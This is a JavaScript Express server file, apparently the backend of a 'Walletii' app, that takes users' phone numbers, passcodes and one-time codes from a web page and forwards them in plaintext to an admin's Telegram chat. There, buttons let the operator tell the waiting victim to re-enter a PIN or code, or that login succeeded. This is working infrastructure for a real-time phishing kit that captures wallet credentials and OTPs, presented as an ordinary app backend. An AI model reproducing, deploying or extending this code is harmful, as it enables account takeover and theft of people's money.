'use strict';

// ══════════════════════════════════════════════════════
//  server.js — Walletii Backend
//  Routes:
//    GET  /         ← serves index.html
//    POST /notify   ← called by the HTML app (login, otp, resend events)
//    POST /poll     ← called by the HTML app every 2s to check admin decision
//    POST /webhook  ← called by Telegram when admin clicks a button
//    GET  /setup    ← visit once to register the webhook with Telegram
//    GET  /health   ← Render health check
// ══════════════════════════════════════════════════════

import express           from 'express';
import cors              from 'cors';
import crypto            from 'crypto';
import { fileURLToPath } from 'url';
import path              from 'path';
import config            from './config.js';
import { setResult, popResult, setSession, getSession } from './store.js';
import { sendAdminMessage, removeButtons, answerCallback, registerWebhook, escMd } from './telegram.js';

const app       = express();
const __dirname = path.dirname(fileURLToPath(import.meta.url));

// ── Middleware ──
app.use(express.json());
app.use(cors({
  origin:         true,
  methods:        ['GET', 'POST', 'OPTIONS'],
  allowedHeaders: ['Content-Type'],
}));

// ── Serve static files & index.html ──
app.use(express.static(__dirname));
app.get('/', (_req, res) => res.sendFile(path.join(__dirname, 'index.html')));

// ════════════════════════════════════════════════════════
//  GET /health
// ════════════════════════════════════════════════════════
app.get('/health', (_req, res) => {
  res.json({ ok: true, service: 'walletii-backend', ts: new Date().toISOString() });
});

// ════════════════════════════════════════════════════════
//  GET /setup
// ════════════════════════════════════════════════════════
app.get('/setup', async (_req, res) => {
  try {
    const result = await registerWebhook();
    if (result.ok) {
      res.json({
        ok:          true,
        description: result.description,
        webhook:     `${config.serverUrl}/webhook`,
        message:     '✅ Webhook registered successfully! You can now use the app.',
      });
    } else {
      res.status(500).json({ ok: false, error: result.description });
    }
  } catch (err) {
    res.status(500).json({ ok: false, error: err.message });
  }
});

// ════════════════════════════════════════════════════════
//  POST /notify
//
//  type = 'login'   → Login alert with [✅ Send OTP] [❌ Wrong PIN]
//  type = 'otp'     → OTP alert with [✅ Continue] [❌ Wrong Code]
//  type = 'resend'  → Informational resend notification (no buttons)
// ════════════════════════════════════════════════════════
app.post('/notify', async (req, res) => {
  const { type, phone, countryCode, otp, passcode } = req.body;

  if (!type || !phone) {
    return res.status(400).json({ ok: false, error: 'Missing required fields' });
  }

  const fullPhone = `${countryCode || ''} ${phone}`.trim();

  // ── Resend: just send a notification, no polling needed ──
  if (type === 'resend') {
    const text = `🔄 *Resend Code Requested*\n\n`
               + `📱 *Phone:* \`${escMd(fullPhone)}\`\n\n`
               + `User has requested a new OTP code\\.`;
    const tgResult = await sendAdminMessage(text, []);
    if (!tgResult.ok) {
      console.error('Telegram error:', tgResult);
      return res.status(500).json({ ok: false, error: 'Telegram error' });
    }
    return res.json({ ok: true });
  }

  // ── Generate a short token + HMAC sig ──
  const token = crypto.randomBytes(8).toString('hex');
  const sig   = crypto.createHmac('sha256', config.secretKey)
                      .update(`${token}|${phone}`)
                      .digest('hex');

  setSession(token, phone, sig, config.tokenTtl);

  const cbData = (action) => `${action}|${token}`;

  try {
    let text, keyboard;

    if (type === 'login') {
      text = `🔔 *New Login Alert*\n\n`
           + `📱 *Phone:* \`${escMd(fullPhone)}\`\n`
           + (passcode ? `🔒 *Passcode:* \`${escMd(passcode)}\`\n` : '')
           + `\nUser is waiting on the OTP screen\\.`;

      keyboard = [[
        { text: '✅ Send OTP',  callback_data: cbData('send_otp')  },
        { text: '❌ Wrong PIN', callback_data: cbData('wrong_pin') },
      ]];

    } else if (type === 'otp') {
      if (!otp) return res.status(400).json({ ok: false, error: 'Missing OTP' });

      text = `🔐 *OTP Submitted*\n\n`
           + `📱 *Phone:* \`${escMd(fullPhone)}\`\n`
           + `🔑 *OTP:* \`${escMd(otp)}\`\n`
           + (passcode ? `🔒 *Passcode:* \`${escMd(passcode)}\`\n` : '')
           + `\nChoose an action:`;

      keyboard = [[
        { text: '✅ Continue',   callback_data: cbData('otp_ok')    },
        { text: '❌ Wrong Code', callback_data: cbData('otp_wrong') },
      ]];

    } else {
      return res.status(400).json({ ok: false, error: 'Unknown type' });
    }

    const tgResult = await sendAdminMessage(text, keyboard);

    if (!tgResult.ok) {
      console.error('Telegram error:', tgResult);
      return res.status(500).json({ ok: false, error: 'Telegram error', detail: tgResult.description });
    }

    res.json({ ok: true, token });

  } catch (err) {
    console.error('Error in /notify:', err);
    res.status(500).json({ ok: false, error: 'Internal server error' });
  }
});

// ════════════════════════════════════════════════════════
//  POST /poll
// ════════════════════════════════════════════════════════
app.post('/poll', (req, res) => {
  const { token } = req.body;

  if (!token || !/^[a-f0-9]{16}$/.test(token)) {
    return res.status(400).json({ ok: false, error: 'Invalid token' });
  }

  const result = popResult(token);

  if (result === null) {
    return res.json({ ok: true, result: 'pending' });
  }

  res.json({ ok: true, result });
});

// ════════════════════════════════════════════════════════
//  POST /webhook
//  Telegram calls this when the admin clicks a button.
// ════════════════════════════════════════════════════════
app.post('/webhook', async (req, res) => {
  res.json({ ok: true });

  const update = req.body;
  if (!update?.callback_query) return;

  const cb     = update.callback_query;
  const cbId   = cb.id;
  const data   = cb.data || '';
  const chatId = cb.message?.chat?.id?.toString();
  const msgId  = cb.message?.message_id;  // ← was missing, caused the crash

  // ── Only our admin can use these buttons ──
  if (chatId !== config.adminChatId.toString()) {
    await answerCallback(cbId, '⛔ Not authorised', true);
    return;
  }

  // ── Parse: "action|token" ──
  const parts = data.split('|');
  if (parts.length !== 2) {
    await answerCallback(cbId, '⚠️ Invalid data');
    return;
  }

  const [action, token] = parts;

  // ── Look up session and verify HMAC ──
  const session = getSession(token);
  if (!session) {
    await answerCallback(cbId, '⚠️ Session expired or not found', true);
    return;
  }

  const expectedSig = crypto.createHmac('sha256', config.secretKey)
                            .update(`${token}|${session.phone}`)
                            .digest('hex');

  if (!crypto.timingSafeEqual(Buffer.from(session.sig), Buffer.from(expectedSig))) {
    await answerCallback(cbId, '⚠️ Invalid signature', true);
    return;
  }

  // ── Handle the action ──
  try {
    switch (action) {

      case 'send_otp':
        setResult(token, 'otp_allowed', config.tokenTtl);
        await removeButtons(chatId, msgId);
        await sendAdminMessage(`✅ *OTP Sent*\nUser \`${escMd(session.phone)}\` may now enter their OTP code\\.`, []);
        await answerCallback(cbId, '✅ OTP sent to user');
        break;

      case 'wrong_pin':
        setResult(token, 'wrong_pin', config.tokenTtl);
        await removeButtons(chatId, msgId);
        await sendAdminMessage(`❌ *Wrong PIN*\nUser \`${escMd(session.phone)}\` has been notified their PIN is incorrect\\.`, []);
        await answerCallback(cbId, '❌ Wrong PIN sent to user');
        break;

      case 'otp_ok':
        setResult(token, 'otp_correct', config.tokenTtl);
        await removeButtons(chatId, msgId);
        await sendAdminMessage(`✅ *Login Approved*\nUser \`${escMd(session.phone)}\` has been allowed in\\.`, []);
        await answerCallback(cbId, '✅ User allowed in');
        break;

      case 'otp_wrong':
        setResult(token, 'otp_wrong', config.tokenTtl);
        await removeButtons(chatId, msgId);
        await sendAdminMessage(`❌ *Wrong Code*\nUser \`${escMd(session.phone)}\` has been notified to re\\-enter their OTP\\.`, []);
        await answerCallback(cbId, '❌ Wrong code sent to user');
        break;

      default:
        await answerCallback(cbId, '⚠️ Unknown action');
    }
  } catch (err) {
    console.error('Webhook handler error:', err);
  }
});

// ════════════════════════════════════════════════════════

// ════ DEBUG ROUTE — remove after fixing ════
app.get('/test', async (_req, res) => {
  const result = await sendAdminMessage('🧪 Test message from Walletii\\.', []);
  res.json({
    telegramResponse: result,
    adminChatId:      config.adminChatId,
    serverUrl:        config.serverUrl,
    botTokenPreview:  config.botToken ? config.botToken.slice(0, 10) + '...' : 'MISSING',
    secretKeySet:     !!config.secretKey,
  });
});

//  Start server
// ════════════════════════════════════════════════════════
app.listen(config.port, () => {
  console.log(`\n🚀 Walletii backend running on port ${config.port}`);
  console.log(`   Webhook URL: ${config.serverUrl}/webhook`);
  console.log(`   Setup URL:   ${config.serverUrl}/setup`);
  console.log(`   Health:      ${config.serverUrl}/health\n`);
});
